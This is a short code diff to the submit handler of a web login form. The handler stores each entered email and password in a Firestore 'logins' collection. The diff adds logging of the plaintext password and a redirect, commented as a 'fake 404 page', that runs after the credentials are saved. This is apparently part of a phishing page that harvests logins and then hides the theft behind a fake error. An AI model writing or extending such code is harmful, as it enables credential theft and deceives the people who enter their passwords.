@@ -53,6 +53,8 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
+            console.log("Form submitted with email:", email, "and password:", password);
+
             // Save to Firestore
             db.collection("logins").add({
                 email: email,
@@ -60,6 +62,9 @@
             })
             .then(() => {
                 alert("Login details saved.");
+                console.log("Document successfully written!");
+                // Redirect to a fake 404 page
+                window.location.href = "404.html";
             })
             .catch((error) => {
                 console.error("Error writing document: ", error);
